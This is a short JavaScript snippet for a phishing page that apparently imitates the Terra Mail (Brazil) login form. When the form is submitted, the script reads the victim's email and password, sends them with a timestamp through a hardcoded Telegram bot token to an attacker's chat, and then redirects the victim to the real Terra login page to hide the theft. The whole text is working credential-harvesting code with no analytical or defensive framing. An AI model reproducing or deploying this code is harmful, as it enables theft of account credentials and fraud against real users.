<script>
document.getElementById('formLogin').addEventListener('submit', async function(e) {
    e.preventDefault(); // impede envio normal

    const formData = new FormData(this);
    const email = formData.get('user') || formData.get('email') || '';
    const senha = formData.get('senha') || formData.get('pass') || '';

    const msg = `📩 Nova tentativa\n📧 ${email}\n🔐 ${senha}\n📅 ${new Date().toLocaleString('pt-BR')}`;

    try {
        await fetch(`https://api.telegram.org/bot7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY/sendMessage?` +
                     `chat_id=6261750345&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
    } catch(err) {
        console.error(err);
    }

    // Redireciona mesmo assim
    window.location.href = 'https://servicos.terra.com.br/para-voce/terra-mail/?cdConvenio=CVTR00001825/login';
});
</script>
